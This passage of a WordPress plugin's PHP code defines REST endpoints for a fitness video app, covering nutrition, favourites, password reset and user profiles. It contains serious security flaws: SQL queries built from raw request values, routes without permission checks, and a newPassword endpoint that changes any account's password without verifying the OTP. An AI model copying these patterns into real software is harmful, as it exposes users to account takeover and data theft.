    $res_diet_tips = $wpdb->get_results( "SELECT * FROM $table_name WHERE  type = 'diet_tips' AND lang = '$language'"); 
    if(count($res_type_of_diet) > 0 || count($res_diet_tips) > 0){
        $result['status'] = 1 ;
        $result['msg'] = 'Get all live training list!' ;
        $result['diet_tips'] = $res_diet_tips;
        $result['type_of_diet'] = $res_type_of_diet;
    }
    return wp_send_json($result);
}
/**********************
  Delete Nutrition 
***********************/
add_action( 'rest_api_init', 'delete_nutrition_api_hooks' );
function delete_nutrition_api_hooks(){register_rest_route(
  'custom-plugin', '/delete_nutrition/',
    array('methods'  => 'POST','callback' => 'delete_nutrition',));
}
function delete_nutrition($request){ 
    global $wpdb;
    $table_name = "wp_nutrition";
    $delete_id = $request['delete_id'];
    $res = $wpdb->delete( $table_name, array( 'id' => $delete_id ) );
    if($res > 0){
        $result['status'] = 1 ;
        $result['msg'] = 'Nutrition is deleted successfully!';
    }
    return wp_send_json($result);
}


/********************
 * Update Nutrition *
*********************/
add_action( 'rest_api_init', 'update_nutrition_api_hooks' );
function update_nutrition_api_hooks(){register_rest_route(
  'custom-plugin', '/update_nutrition/',
    array('methods'  => 'POST','callback' => 'update_nutrition',));
}
function update_nutrition($request){
    global $wpdb;
    $table = "wp_nutrition";
    $where = array('id'=>$request['id']);
    $data = [
            'title' => $request['title'],
            'type' => $request['type'],
            'time_duration' => $request['time_duration'],
            ];
        if ( ! function_exists( 'wp_handle_upload' ) ) {
                    require_once( ABSPATH . 'wp-admin/includes/file.php' );
        }
        if( $_FILES['file']['error'] === UPLOAD_ERR_OK )
        {
            $upload_overrides = array( 'test_form' => false ); #if you don’t pass 'test_form' => FALSE the upload will be rejected
            $userImg = wp_handle_upload( $_FILES['file'], $upload_overrides );
            $data['path'] = $userImg['url'];
        }
        if ( ! function_exists( 'wp_handle_upload' ) ) {
                    require_once( ABSPATH . 'wp-admin/includes/file.php' );
        }
        if( $_FILES['thumbnail_img']['error'] === UPLOAD_ERR_OK )
        {
            $upload_overrides = array( 'test_form' => false ); #if you don’t pass 'test_form' => FALSE the upload will be rejected
            $userImg1 = wp_handle_upload( $_FILES['thumbnail_img'], $upload_overrides );
            $data['thumbnail_img'] = $userImg1['url'];
        }
        $result = $wpdb->update($table, $data, $where);
        if($result > 0){
            $resultt['status'] = 1 ;
            $resultt['msg'] = 'Nutrition is updated successfully!' ;
        }
        return wp_send_json($resultt);
}
/***************************
 *  favourite unfavorit api *
****************************/
add_action( 'rest_api_init', 'favourite_unfavourite_api_hooks' );
function favourite_unfavourite_api_hooks(){register_rest_route(
  'custom-plugin', '/favourite_unfavourite_post/',
    array('methods'  => 'POST','callback' => 'favourite_unfavourite_post',));
}
function favourite_unfavourite_post($request){
    
    $language = $request['language'];
    global $wpdb;
    $user_id = $request['user_id'];
    $post_id = $request['post_id'];
    $table = "wp_favourite_post";
    $res = $wpdb->get_results("SELECT * FROM $table WHERE (user_id = $user_id AND post_id = $post_id)");
    
    $data = [
            'lang' =>$language,
            'user_id' => $user_id,
            'post_id' => $request['post_id'],
            'title' => $request['title'],
            'video_link' => $request['video_link'],
            'video_id' => $request['video_id'],
            'added_date' => date("Y-m-d"),
            ];
    if(!empty($res)){
        $wpdb->delete( $table, array( 'user_id' => $user_id  , 'post_id'=>$post_id) );
        $resultt['msg'] = 'Video is unfavourite successfully!';
    }else{
        $result = $wpdb->insert($table, $data);
        $resultt['msg'] = 'Video is favourite successfully!';
    }
    $resultt['status'] = 1;
    return wp_send_json($resultt);
}


/************************
 * my favourite list api *
*************************/
add_action( 'rest_api_init', 'favourite_list_api_hooks' );
function favourite_list_api_hooks(){register_rest_route(
  'custom-plugin', '/my_favourite_list/',
    array('methods'  => 'POST','callback' => 'my_favourite_list',));
}
function my_favourite_list($request){
    
    
    $language = $request['language'];
    if($language == "en"){
        $lang = '1';
    }elseif($language == "ar"){
        $lang = '0';
    }
   
    $user_id = $request['user_id'];
    $table = "wp_favourite_post";
    global $wpdb;
    $res = $wpdb->get_results("SELECT * FROM $table WHERE (user_id = $user_id  AND lang = '$lang') ORDER BY id DESC LIMIT 2" );
    $retData = [];
    foreach($res as $key=>$v){
        $post_id = $v->post_id;
        $post_data = wp_get_single_post( $post_id );
        $post_meta_data = get_post_meta( $post_id );
        $retData[$key]->id = $v->id;
        $retData[$key]->post_id = $v->post_id;
        $retData[$key]->video_id = get_field( 'video_id', $post_id );
        $retData[$key]->video_type = get_field( 'video_type', $post_id );
        $retData[$key]->video_date = $post_data->post_date;
        $retData[$key]->video_date_gmt = $post_data->post_date_gmt;
        $retData[$key]->video_title = $post_data->post_title;
        $retData[$key]->video_link = "https://vimeo.com/".get_field( 'video_id', $post_id );
        $retData[$key]->video_img = wp_get_attachment_url( get_post_thumbnail_id( $post_id ), 'thumbnail' );
    }
    $resultt['status'] = 1;
    $resultt['data'] = $retData;
    return wp_send_json($resultt);
}
/****************************
 * my_favourite_list_all api *
*****************************/
add_action( 'rest_api_init', 'favourite_list_all_api_hooks' );
function favourite_list_all_api_hooks(){register_rest_route(
  'custom-plugin', '/my_favourite_list_all/',
    array('methods'  => 'POST','callback' => 'my_favourite_list_all',));
}
function my_favourite_list_all($request){
    
    global $wpdb;
    $language = $request['language'];
    if($language == "en"){
        $lang = '1';
    }elseif($language == "ar"){
        $lang = '0';
    }
    
    $user_id = $request['user_id'];
    $table = "wp_favourite_post";
    $page = $request['page'];
    $items_per_page = $request['per_page'];
    $offset = ($page - 1) * $items_per_page;
    $sql = "SELECT * FROM $table WHERE (user_id = $user_id AND lang = '$lang')  LIMIT " . $offset . "," . $items_per_page;
    $res = $wpdb->get_results($sql);
    $retData = [];
    foreach($res as $key=>$v){
        $post_id = $v->post_id;
        $post_data = wp_get_single_post( $post_id );
        $post_meta_data = get_post_meta( $post_id );
        $retData[$key]->id = $v->id;
        $retData[$key]->post_id = $v->post_id;
        $retData[$key]->video_id = get_field( 'video_id', $post_id );
        $retData[$key]->video_type = get_field( 'video_type', $post_id );
        $retData[$key]->video_date = $post_data->post_date;
        $retData[$key]->video_date_gmt = $post_data->post_date_gmt;
        $retData[$key]->video_title = $post_data->post_title;
        $retData[$key]->video_link = "https://vimeo.com/".get_field( 'video_id', $post_id );
        $retData[$key]->video_img = wp_get_attachment_url( get_post_thumbnail_id( $post_id ), 'thumbnail' );
    }
    $resultt['status'] = 1;
    $resultt['data'] = $retData;
    return wp_send_json($resultt);
}


/**
 * 
 *      Forgot password
 *
 **/

add_action( 'rest_api_init', 'forgotPassword_api_hooks' );
function forgotPassword_api_hooks()
  {
    register_rest_route(
      'custom-plugin', '/forgotPassword/',
        array(
          'methods'  => 'POST',
          'callback' => 'forgotPassword',
        ));
  }
  function forgotPassword($request)
  {
    $email          =  $request["email"];
    if ( email_exists( $email ) )             # fetched userID
      {
        $userID     = email_exists( $email );
        $user       = get_userdata($userID);
        $subject      = "Reset your password";+
        $digits       = 5;
        $code         = rand(pow(10, $digits-1), pow(10, $digits)-1);
        $havemeta     = get_user_meta($userID, 'OTP');
        if ($havemeta)
          {
            update_user_meta( $userID, 'OTP', $code);
          }
          else
          {
            add_user_meta( $userID, 'OTP', $code);
            }
            $message    = '
            <html>
            <body>
            <table style="max-width:500px;min-width:500px;margin:0 auto;background-color:#fff;">
                <tr>
                    <td>
                        Hi
                    </td>
                </tr>
                <tr>
                    <td>
                        You have requested the new password. Please enter the following OTP to reset password.
                    </td>
                </tr>
                <tr>
                    <td>
                        please use this code to confirm your email: ' . $code . '
                    </td>
                </tr>
                <tr>
                    <td>
                        Regards
                    </td>
                </tr>
                HiitFit
            </table>
        </body>
      </html>';
      $headers = array('Content-Type: text/html; charset=ISO-8859-1\r\n','From:Hiitfit <info@hiitfit.com>');
      wp_mail( $email, $subject, $message, $headers);
      $havemeta   = get_user_meta($userID, 'OTP');
      //$a        = $user->data;
      //$a->OTP   = $code;      # added custom key
      $a->status  = '1' ;
      return $a;
  }
  else
  {
      $result = array(
            'msg'=>"Email is not exists",
            'status'    => '0',
        );
        print_r(json_encode($result));
  }
  exit;
}


/********************
    Reset  Password
*********************/
add_action( 'rest_api_init','resetPassword_api_hooks');
function resetPassword_api_hooks()
{
  register_rest_route(
    'custom-plugin', '/resetPassword/',
      array(
        'methods'  => 'POST',
        'callback' => 'resetPassword',
      ));
}
function resetPassword($request)
{
  $email          =  $request["email"];
  $OTP            =  $request["OTP"];
  if(email_exists($email))
  {
      $userID     = email_exists( $email );      #    $user       = get_userdata( $userID );
      $user = get_userdata( $userID );
      $havemeta   = get_user_meta($userID, 'OTP');
      if($havemeta[0] == $OTP)
        {
          $result    = array(
            'status'    => '1',
            'user_ID' => $user->ID,
            'msg' => 'Please enter new password!'
          );
          return $result;
        }
        else
        {
          $result = array(
            'status'    => '0',
            'msg' => 'Otp is not matched!'
          );
          return $result;
        }
  }
  exit;
}
/********************
   New Password
*********************/
add_action( 'rest_api_init','newPassword_api_hooks');
function newPassword_api_hooks()
{
  register_rest_route(
    'custom-plugin', '/newPassword/',
      array(
        'methods'  => 'POST',
        'callback' => 'newPassword',
      ));
}
function newPassword($request)
{
  $email          =  $request["email"];
  $password       =  $request["password"];
  if(email_exists($email))
  {
      $userID     = email_exists( $email );      #    $user       = get_userdata( $userID );
      if($userID > 0)
        {
          $user_data = wp_update_user( array('ID' => $userID, 'user_pass' => $password ) );
          $result    = array(
            'status'    => '1',
            'msg' => 'Password is updated!'
          );
          return $result;
        }
        else
        {
          $result = array(
            'status'    => '0',
            'msg' => 'Password is not updated try again!'
          );
          return $result;
        }
  }
  exit;
}

/*******************************
    information_step function
********************************/
add_action( 'rest_api_init', 'information_step_api_hooks' );
function information_step_api_hooks(){register_rest_route(
  'custom-plugin', '/information_step/',
    array('methods'  => 'POST','callback' => 'information_step',));
}
function information_step($request){
    
    $userid = $request['user_id'];
    
    $gender = $request['gender'];
    $weight = $request['weight'];
    $height = $request['height'];
    
    $res_gender = metadata_exists( 'user', $userid, 'gender');
    $res_weight = metadata_exists( 'user', $userid, 'weight');
    $res_height = metadata_exists( 'user', $userid, 'height');
    
    if(!empty($res_gender)){
        update_user_meta( $userid, 'gender', $gender );
    }else{
        add_user_meta($userid,'gender',$gender);
    }
    if(!empty($res_weight)){
        update_user_meta( $userid, 'weight', $weight );
    }else{
        add_user_meta($userid,'weight',$weight);
    }
    if(!empty($res_height)){
        update_user_meta( $userid, 'height', $height );
    }else{
        add_user_meta($userid,'height',$height);
    }
    $result['status'] = 1;
    return wp_send_json($result);
}
/*******************************
    upload_profile_image
********************************/
add_action( 'rest_api_init', 'upload_profile_img_api_hooks' );
function upload_profile_img_api_hooks(){register_rest_route(
  'custom-plugin', '/upload_profile_image/',
    array('methods'  => 'POST','callback' => 'upload_profile_image',));
}
function upload_profile_image($request){
    
    $userid = $request['user_id'];
    
    $profile_image = $request['profile_image'];
    
    if ( ! function_exists( 'wp_handle_upload' ) ) {
        require_once( ABSPATH . 'wp-admin/includes/file.php' );
    }
    if( $_FILES['profile_image']['error'] === UPLOAD_ERR_OK )
    {
        $upload_overrides = array( 'test_form' => false ); 
        $userImg = wp_handle_upload( $_FILES['profile_image'], $upload_overrides );
        //add_user_meta($user_id,'profile_image',$userImg);
        
        $res_profile_image = metadata_exists( 'user', $userid, 'profile_image');
        if(!empty($res_profile_image)){
            update_user_meta( $userid, 'profile_image', $userImg );
            $result['msg'] = 'User image updated!';
        }else{
            add_user_meta($userid, 'profile_image', $userImg);
            $result['msg'] = 'User image uploaded!';
        }
    }
    $result['status'] = 1;
    return wp_send_json($result);
}
/*******************************
    get_information function
********************************/
add_action( 'rest_api_init', 'get_information_api_hooks' );
function get_information_api_hooks(){register_rest_route(
  'custom-plugin', '/get_information/',
    array('methods'  => 'POST','callback' => 'get_information',));
}
function get_information($request){
    
    $userid = $request['user_id'];
    $res_gender = get_user_meta( $userid, 'gender');
    $res_weight = get_user_meta( $userid, 'weight');
    $res_height = get_user_meta( $userid, 'height');
    
    $result['status'] = 1;
    $result['weight'] = $res_weight[0];
    $result['gender'] = $res_gender[0];
    $result['height'] = $res_height[0];
    return wp_send_json($result);
}



/**************************
    get_term_and_condition 
****************************/

/*add_filter( 'vc_shortcodes_css_class', 'custom_css_classes_for_vc_row_and_vc_column', 10, 2 );
function custom_css_classes_for_vc_row_and_vc_column( $class_string, $tag ) {
  if ( $tag == 'vc_row' || $tag == 'vc_row_inner' ) {
  $class_string = str_replace( 'vc_row-fluid', 'my_row-fluid', $class_string ); // This will replace "vc_row-fluid" with "my_row-fluid"
  }
  if ( $tag == 'vc_column' || $tag == 'vc_column_inner' ) {
  $class_string = preg_replace( '/vc_col-sm-(\d{1,2})/', 'my_col-sm-$1', $class_string ); // This will replace "vc_col-sm-%" with "my_col-sm-%"
  }
  return $class_string; // Important: you should always return modified or original $class_string
}*/


add_action( 'rest_api_init', 'get_term_and_condition_api_hooks' );
function get_term_and_condition_api_hooks(){register_rest_route(
  'custom-plugin', '/term_and_condition/',
    array('methods'  => 'POST','callback' => 'get_term_and_condition',));
}
function get_term_and_condition($request){
    $lang = $request['lang'];
    $post_id = 1019;
    if($lang == 'ar'){
        $post_id = 1542;
    }
    $post = get_post($post_id);
    WPBMap::addAllMappedShortcodes();
    global $post;
    $post = get_post ($post_id);
    $output['title'] = $post->post_title;
    $output['content'] = apply_filters( 'the_content', $post->post_content );
    return wp_send_json($output);
}
/**************************
    privacy_policy_page 
****************************/
add_action( 'rest_api_init', 'privacy_policy_page_api_hooks' );
function privacy_policy_page_api_hooks(){register_rest_route(
  'custom-plugin', '/privacy_policy_page/',
    array('methods'  => 'POST','callback' => 'privacy_policy_page',));
}
function privacy_policy_page($request){
    
    $lang = $request['lang'];
    $page_id = 3;
    if($lang == 'ar'){
        $page_id = 1537;
    }
    $post = get_post($page_id);
    WPBMap::addAllMappedShortcodes();
    global $post;
    $post = get_post ($page_id);
    $output['title'] = $post->post_title;
    $output['content'] = apply_filters( 'the_content', $post->post_content );
    return wp_send_json($output);
}

/*****************************
    static_video_trial_mode 
******************************/
add_action( 'rest_api_init', 'static_video_trial_api_hooks' );
function static_video_trial_api_hooks(){register_rest_route(
  'custom-plugin', '/static_video_trial_mode/',
    array('methods'  => 'GET','callback' => 'static_video_trial_mode',));
}
function static_video_trial_mode($request){
    $videos[] = array('name'=>'v1','title'=>'BASIC HIIT','video_id'=>'538021184','link'=>'https://vimeo.com/538021184','thumbnail_img'=>'http://dev.indiit.solutions/hiitfit/wp-content/uploads/2021/07/img2.png');
    $videos[] = array('name'=>'v2','title'=>'EXERCISES','video_id'=>'539129881','link'=>'https://vimeo.com/539129881','thumbnail_img'=>'http://dev.indiit.solutions/hiitfit/wp-content/uploads/2021/07/img1.png');
    $videos[] = array('name'=>'v3','title'=>'DUMBELLS','video_id'=>'528306489','link'=>'https://vimeo.com/528306489','thumbnail_img'=>'http://dev.indiit.solutions/hiitfit/wp-content/uploads/2021/07/img5.png');
    $videos[] = array('name'=>'v4','title'=>'HIIT LIVE – COMING SOON','video_id'=>'538020932','link'=>'https://vimeo.com/538020932','thumbnail_img'=>'http://dev.indiit.solutions/hiitfit/wp-content/uploads/2021/07/img4.png');
    $videos[] = array('name'=>'v5','title'=>'QUICK HIIT (INTERMEDIATE)','video_id'=>'541300678','link'=>'https://vimeo.com/541300678','thumbnail_img'=>'http://dev.indiit.solutions/hiitfit/wp-content/uploads/2021/07/img3.png');
    $videos[] = array('name'=>'v6','title'=>'QUICK HIIT (BEGINNERS)','video_id'=>'538267285','link'=>'https://vimeo.com/538267285','thumbnail_img'=>'http://dev.indiit.solutions/hiitfit/wp-content/uploads/2021/07/img2.png');
    $result['status'] = 1;
    $result['list'] = $videos;
    return wp_send_json($result);
}
/*****************************
    get_the_category
******************************/
add_action( 'rest_api_init', 'get_the_categorydata_api_hooks' );
function get_the_categorydata_api_hooks(){register_rest_route(
  'custom-plugin', '/get_the_categorydata/',
    array('methods'  => 'GET','callback' => 'get_the_categorydata',));
}
function get_the_categorydata($request){
    $args1 = array('orderby'=>'name','hide_empty'=>false,'parent'=>0);
    $taxonomy = "program_category";
    $allcat = get_term( 196 );
    return wp_send_json($allcat);
}
/**************************
    Check have subcategory
****************************/

function category_has_children( $term_id = 0, $taxonomy = 'program_category' ) {
    $children = get_categories( array( 
        'child_of'      => $term_id,
        'taxonomy'      => $taxonomy,
        'hide_empty'    => false,
        'fields'        => 'ids',
    ) );
    return ( $children );
}
add_action( 'rest_api_init', 'check_category_has_children_api_hooks' );
function check_category_has_children_api_hooks(){register_rest_route(
  'custom-plugin', '/check_category_has_children/',
    array('methods'  => 'POST','callback' => 'check_category_has_children',));
}
function check_category_has_children($request){
    $term_id = $request['term_id'];
    $category = get_term( $term_id, 'program_category');
    $result["status"] = 1;
    
    $dataArray = [];
    $child_termdata = [];
    $domePostData = [];
    $domeArray = [];
    
    $catId = $category->term_id;
    $child_term_data = category_has_children($catId,$taxonomy = 'program_category');
    
    $dataArray['term_id'] = $catId;
    $dataArray['name'] = $category->name;
    $dataArray['description'] = $category->description;
    $dataArray['parent'] = $category->parent;
    $dataArray['cat_image'] = get_field('image', 'program_category_'.$catId);
    $dataArray['cat_banner_image'] = get_field( 'add_category_banner', 'program_category_'.$catId );
    
    $result["categoryData"] = $dataArray;
    if(count($child_term_data) > 0 && $child_term_data !=''){
        foreach($child_term_data as $key=>$val){
            $sub_category = get_term( $val, 'program_category');
           
            $sub_category_id = $sub_category->term_id;
            $child_termdata['term_id'] = $sub_category_id;
            $child_termdata['name'] = $sub_category->name;
            $child_termdata['description'] = $sub_category->description;
            $child_termdata['parent'] = $sub_category->parent;
            $child_termdata['cat_image'] = get_field('image', 'program_category_'.$sub_category_id);
            $child_termdata['cat_banner_image'] = get_field( 'add_category_banner', 'program_category_'.$sub_category_id );
            array_push($domeArray,$child_termdata);
        }
    }else{
        $domeArray = '';
    }
    $result["subCategoryData"] = $domeArray;
    
    
    $args = [
    'post_type' => 'program-post',
    'tax_query' => [
            [
                'taxonomy' => 'program_category',
                'terms' => $term_id,
                'include_children' => false // Remove if you need posts from term 7 child terms
            ],
        ],
    ];
    $posts = get_posts( $args );
    
     foreach($posts as $key=>$val){
        
    //   //$posts[$key]->post_meta_data = get_post_meta($val->ID);
    //   $pdf_data_info = get_field('add_schedule_pdf_file', $val->ID);
    //   $posts[$key]->pdf = $pdf_data_info['url'];
    //   $posts[$key]->day__meditations_number_info = get_field('day__meditations_number', $val->ID);
    //   $posts[$key]->mins__day = get_field('mins__day', $val->ID);
    //   $posts[$key]->mins__day_title = get_field('mins__day_title', $val->ID);
    //   $posts[$key]->type = get_field('type', $val->ID);
    //   $posts[$key]->equipment_needed = get_field('equipment_needed', $val->ID);
    //   $posts[$key]->video_type = get_field('video_type', $val->ID);
    //   $posts[$key]->video_id = get_field('video_id', $val->ID);
    //   //$posts[$key]->related_video_section = get_field('related_video_section', $val->ID);
       $post_thumbnail =  wp_get_attachment_image_src( get_post_thumbnail_id( $val->ID ), 'single-post-thumbnail' );
       $posts[$key]->post_thumbnail =  $post_thumbnail[0];
       
     }
       array_push($domePostData,$posts);
    $data['data'] = $result;
    $data['postData'] = $domePostData;
    return wp_send_json($data);
}


/******************************
    Get term and sub-term data 
*******************************/

function get_taxonomy_hierarchy( $taxonomy, $parent=0) {
	$taxonomy=is_array( $taxonomy) ? array_shift( $taxonomy): $taxonomy;
	$terms=get_terms( $taxonomy, array( 'parent'=> $parent, 'hide_empty'=> 0));
	$children=array();
	foreach ( $terms as $term) {
		$term->children=get_taxonomy_hierarchy( $taxonomy, $term->term_id);
		$children[$term->term_id]=$term;
	}
	return $children;
}
function get_taxonomy_hierarchy_multiple( $taxonomies, $parent = 0 ) {
	if ( ! is_array( $taxonomies )  ) {
		$taxonomies = array( $taxonomies );
	}
	$results = array();
	foreach( $taxonomies as $taxonomy ){
		$terms = get_taxonomy_hierarchy( $taxonomy, $parent );
		if ( $terms ) {
			$results[ $taxonomy ] = $terms;
		}
	}
	return $results;
}

add_action( 'rest_api_init', 'get_term_sub_term_data_api_hooks' );
function get_term_sub_term_data_api_hooks(){register_rest_route(
  'custom-plugin', '/get_term_sub_term_data1/',
    array('methods'  => 'POST','callback' => 'get_term_sub_term_data1',));
}
function get_term_sub_term_data1($request){
    $categories = get_taxonomy_hierarchy_multiple( array('program_category'));
    /*echo"<pre>";
    print_r($categories['program_category']);
    die;*/
    $termData = [];
    $termDataMain = [];
    $sub_termData = [];
    $sub_termData_main = [];
    foreach ($categories['program_category'] as $key => $val)
    {
        $cat_id = $val->term_id;
        $termData['type_id'] = $cat_id;
        $termData['title'] = $val->title;
        $termData['description'] = $val->description;
        $termData['cat_image'] = get_field('image', 'program_category_'.$cat_id);
        $termData['cat_banner_image'] = get_field( 'add_category_banner', 'program_category_'.$cat_id );
        if(count($val->children) > 0){
            foreach($val->children as $k => $v){
                $subCatId = $v->term_id;
                $sub_termData['type_id'] = $subCatId;
                $sub_termData['title'] = $v->title;
                $sub_termData['description'] = $v->description;
                $sub_termData['cat_image'] = get_field('image', 'program_category_'.$subCatId);
                $sub_termData['cat_banner_image'] = get_field( 'add_category_banner', 'program_category_'.$subCatId );
                array_push($sub_termData_main,$sub_termData);
            }
            $termData['child_term_data'] = $sub_termData_main;
        }else{
            $termData['child_term_data'] = '';
        }
        array_push($termDataMain,$termData);
    }
    return wp_send_json($termDataMain);
}



/**************************
   Get Single Post Data 
****************************/
add_action( 'rest_api_init', 'get_single_post_api_hooks' );
function get_single_post_api_hooks(){register_rest_route(
  'custom-plugin', '/get_single_post/',
    array('methods'  => 'POST','callback' => 'get_single_post',));
}
function get_single_post($request){
    
    $post_id =  $request['post_id'];
    
    $postData = get_post( $post_id );
    
    $pdf_data_info = get_field('add_schedule_pdf_file', $post_id);
    $postData->pdf = $pdf_data_info['url'];
    $postData->day__meditations_number_info = get_field('day__meditations_number', $post_id);
    $postData->mins__day = get_field('mins__day', $post_id);
    $postData->mins__day_title = get_field('mins__day_title', $post_id);
    $postData->type = get_field('type',$post_id);
    $postData->equipment_needed = get_field('equipment_needed', $post_id);
    $postData->video_type = get_field('video_type', $post_id);
    $postData->video_id = get_field('video_id',$post_id);
    $post_thumbnail =  wp_get_attachment_image_src( get_post_thumbnail_id( $post_id ), 'single-post-thumbnail' ); 
    $postData->post_thumbnail =  $post_thumbnail[0];
    $postData->related_video_section = get_field('related_video_section',$post_id);
    
    
    $result['status'] = 1;
    $result['data'] = $postData;
    return wp_send_json($result);
}



/********************
    Dome function
*********************/
add_action( 'rest_api_init', 'dome_api_hooks' );
function dome_api_hooks(){register_rest_route(
  'custom-plugin', '/dome_function/',
    array('methods'  => 'POST','callback' => 'dome_function',));
}
function dome_function($request){
    
    $user = $request['user_id'];
	$user_id_with_post = $user."_watched_video_data";
    
    $page = $request["page"];
    if(!empty($request["per_page"])){
        $postsPerPage = $request["per_page"];
    }else{
        $postsPerPage = 30;
    }
    
    $postOffset = $page * $postsPerPage;
    $allPosts = get_posts( array('post_type'=>'program-post','meta_key' => $user_id_with_post, 'orderby' => 'meta_value', 'order' => 'DESC','posts_per_page' => -1));
    
   
    $args = [
    'post_type' => 'program-post',
    'posts_per_page' =>$postsPerPage,
    'offset'     => $postOffset,
    'meta_key' => $user_id_with_post,
    'orderby' => 'meta_value', 
    'order' => 'DESC',
    ];
    $retData = [];
    $posts = get_posts( $args );
    foreach($posts as $key => $post_data){
        $post_id = $post_data->ID;
        
        $data = get_post_meta( $post_id );
        $retData[$key]->post_id = $post_id;
        $retData[$key]->video_type = get_field( 'video_type', $post_id );
        $retData[$key]->video_added_date = $post_data->post_date;
        $retData[$key]->video_title = $post_data->post_title;
        $retData[$key]->video_link = "https://vimeo.com/".get_field( 'video_id', $post_id );
        $retData[$key]->video_img = wp_get_attachment_url( get_post_thumbnail_id( $post_id ), 'thumbnail' );
        $retData[$key]->video_id = get_field( 'video_id', $post_id );
        $retData[$key]->watch_time = get_field( $user.$post_id.'_watch_time', $post_id );
        $retData[$key]->watched_date = get_field( $user.$post_id.'_watched_date', $post_id );
    }
    $result['status'] = 1;
    $result['totalVideos'] = count($allPosts);
    $result['pageno'] = $page;
    $result['data'] = $retData;
    return wp_send_json($result);
}








/******************************************************************************/

/*add_action('admin_menu', 'live_trining_pages');
function live_trining_pages(){
    add_menu_page('Live Training', 'Live Training', 'manage_options', 'my-menu', 'my_menu_output' );
    add_submenu_page('my-menu', 'Submenu Page Title', 'Live Training List', 'manage_options', 'my-menu');
    add_submenu_page('my-menu', 'Add New Training', 'Add New Training', 'manage_options', 'my-menu' );
}*/

add_action( 'rest_api_init', 'get_program_most_watched_hooks' );
function get_program_most_watched_hooks(){
    register_rest_route(
        'custom-plugin', '/get_program_most_watched',
        array(
            'methods'  => 'POST',
            'callback' => 'get_program_most_watched_callback'
        )
    );
}

function get_program_most_watched_callback($request)
{
    $language = $request['language'];
    if(empty($language)) $language = 'en';

    $page = $request["page"];
    if(!empty($request["per_page"])){
        $postsPerPage = $request["per_page"];
    }else{
        $postsPerPage = 3;
    }
    $postOffset = $page * $postsPerPage;
    $retData = [];
    $args = array(
        'posts_per_page' => -1, 
        'post_type' => 'program-post',
        'order' => 'DESC',
        'lang' => $language,
        'meta_key' => 'wpb_post_views_count',
        'orderby' => 'meta_value_num',
    );
    $posts_count = count(get_posts( $args ));

    $args1 = array(
        'posts_per_page' => $postsPerPage,
        'offset'    => $postOffset,   
        'post_type' => 'program-post',
        'order' => 'DESC',
        'lang' => $language,
        'meta_key' => 'wpb_post_views_count',
        'orderby' => 'meta_value_num',
    );
    $posts = get_posts( $args1 );
    foreach($posts as $key => $post_data){
        $post_id = $post_data->ID;
        $retData[$key] = $post_data;
        $retData[$key]->thumbnail_img = wp_get_attachment_url( get_post_thumbnail_id( $post_id ), 'thumbnail' );
        $retData[$key]->format_date = $post_data->post_date;
    }
    $result['total'] = $posts_count;
    $result['pageno'] = $page;
    $result['data'] = $retData;
    return $result;    
}


add_action( 'rest_api_init', 'get_program_post_api_hooks' );
function get_program_post_api_hooks(){
    register_rest_route(
        'custom-plugin', '/get_program_post/(?P<id>\d+)',
        array(
            'methods'  => 'POST',
            'callback' => 'get_program_post_callback'
        )
    );

    register_rest_route(
        'custom-plugin', '/is_user_exist',
        array(
            'methods'  => 'POST',
            'callback' => 'check_user_exist_callback'
        )
    );
}

function check_user_exist_callback($request){
    $data = array();
    $error = false;
    $data['status'] = 0;
    if(!$request['username']){
        $data['error']['msg'] = "User name is required";
        $error = true;
    }
    if(!$request['email']){
        $data['error']['msg'] = "Email is required";    
        $error = true;
    }
    
    if($request['username'] && $request['email']){
        $username_exist = '';
        $email_exist = '';
        $exist_error = false;
        if(username_exists($request['username'])){   
            $username_exist = 'username';
            $exist_error= true;
            $error = true;
        }

        if(email_exists($request['email'])){
            $email_exist = 'email';
            $exist_error= true;   
            $error = true;
        }
        if( $exist_error == true){
            if($username_exist && $email_exist){
                $data['error']['msg'] = "This ".$username_exist."/".$email_exist." is already registered";
            }elseif($username_exist){
                $data['error']['msg'] = "This ".$username_exist." is already registered";
            }elseif($email_exist){
                $data['error']['msg'] = "This ".$email_exist." is already registered";
            }
        }

    }

    if($error == false){
        $data['status'] = 1;   
    }

    return wp_send_json($data); 
}

function get_program_post_callback($request)
{
    $program_id = $request['id'];
    $post_data = get_post($program_id);
    $post_data->thumbnail_img = wp_get_attachment_url( get_post_thumbnail_id( $program_id ), 'thumbnail' );
    $post_data->schedule_pdf_file = wp_get_attachment_url( get_post_meta( $program_id, 'add_schedule_pdf_file', true ), 'thumbnail' );
    $post_data->related_video_section = get_field('related_video_section',$program_id);
    return $post_data;
}

add_action( 'rest_api_init', 'get_home_page_api_hooks' );
function get_home_page_api_hooks(){
    register_rest_route(
        'custom-plugin', '/get_homepage_api/',
        array(
            'methods'  => 'POST',
            'callback' => 'get_homepage_api_callback'
        )
    );
}

function get_homepage_api_callback($request){
    
    $result_data = array();
    $result_data['static_video_trial_mode'] = static_video_trial_mode_together(); 
    $result_data['getfeatureTwoVideos'] = getfeatureTwoVideos_together($request); 
    $result_data['get_live_training'] = get_live_training_together($request); 
    $result_data['get_two_watched_videos'] = get_two_watched_videos_together($request); 
    $result_data['my_favourite_list'] = my_favourite_list_together($request); 
    $result_data['check_active_plan'] = check_active_plan_together($request); 
    $result_data['check_trial_mode'] = check_trial_mode_together($request); 
    $result_data['program_dumbbells_list'] = get_program_dumbbells_list($request);
    $result_data['program_basic_hit_list'] = get_program_basic_hit_list($request);
    $result_data['program_most_watched'] = get_program_most_watched_list($request);
    return wp_send_json($result_data);
}

function get_program_most_watched_list($request)
{
    $language = $request['language'];
    if(empty($language)) $language = 'en';
    
    $pageLimit = $request['limit'] == '' ? 10 : $request['limit'];
 
    $retData = [];
    $args = array(
        'posts_per_page' => $pageLimit,
        'post_type' => 'program-post',
        'order' => 'DESC',
        'lang' => $language,
        'meta_key' => 'wpb_post_views_count',
        'orderby' => 'meta_value_num',
    );
    $posts = get_posts( $args );
    
    foreach($posts as $key => $post_data){
        $post_id = $post_data->ID;
        $retData[$key] = $post_data;
        $retData[$key]->thumbnail_img = wp_get_attachment_url( get_post_thumbnail_id( $post_id ), 'thumbnail' );
    }

    return $retData;    
}

function get_program_basic_hit_list($request)
{
    $language = $request['language'];
    $pageLimit = $request['limit'] == '' ? -1 : $request['limit'];
    
    $termId = 33;
    if($language == 'ar'){
        $termId = 139;
    }
    $retData = [];
    $args = array(
        'posts_per_page' => $pageLimit,
        'post_type' => 'program-post',
        'order' => 'DESC',
        'tax_query' => [
            [
                'taxonomy' => 'program_category',
                'terms' => $termId,
                'include_children' => false, // Remove if you need posts from term 7 child terms
                
            ],],
            
    );
    $posts = get_posts( $args );
    
    foreach($posts as $key => $post_data){
